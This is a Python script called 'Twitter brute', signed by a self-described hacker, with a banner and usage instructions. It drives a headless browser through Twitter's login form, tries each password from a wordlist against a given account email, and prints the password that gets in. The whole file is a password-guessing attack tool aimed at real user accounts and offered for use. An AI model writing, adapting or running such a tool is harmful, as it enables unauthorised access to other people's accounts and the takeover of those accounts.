import mechanicalsoup
from optparse import OptionParser
parse = OptionParser("""
 ___    ___ 
( _<    >_ ) 
//        \\\ 
\\\___..___// 
  `-(    )-'         {Twitter brute } 
    _|__|_ 
   /_|__|_\ 
   /_|__|_\ 
   /_\__/_\ 
    \ || /  _)       [ Coded by : Ali-MOHAMAD ] 
      ||   ( )       [ Info: Syrian Hacker_2020 ] 
      \\\___// 
       `---' 
==============================================================
  [-- ALI-MOHAMAD : Facebook & youtube & Github --]         
  https://www.facebook.com/ALi20Hack          
  https://github.com/Ali20hack          
  https://www.youtube.com/channel/UCkOu7kHM1aJkJw87d2FlG9Q          
============================================================== 
-----> how to use : python2 Twitt-brute.py -e mail -l passlist.txt

""")
parse.add_option('-e','--email',dest='email',type='string',help='the account email')
parse.add_option('-l','--list',dest='password_list',type='string',help='password list')
(options,args) = parse.parse_args()
if options.email == None or  options.password_list == None:
    print(parse.usage)
    exit(0)
else:
    try:
        print("[---------- start attacking email ----------]")
        browser = mechanicalsoup.Browser(soup_config={"features":"html.parser"})
        login_page = browser.get("https://twitter.com/login?lang=en")
        password_list = options.password_list
        email = options.email
        open_password_list = open(password_list,'r')
        for i in open_password_list.readlines():
            i = i.rstrip("\n")
            login_form = login_page.soup.select("form")[1]
            login_form.select("input")[0]['value'] = email #username
            login_form.select("input")[1] ['value'] = i #password
            secound_page = browser.submit(login_form,login_page.url)
            print("[*]trying {0}".format(i))
            if secound_page.soup.select("title")[0].text != "Login on Twitter":
                print ("[+] login password is {0}".format(i))
                exit(0)
    except Exception as e:
        print(e)
    except KeyboardInterrupt:
        print("OK ! as you like")
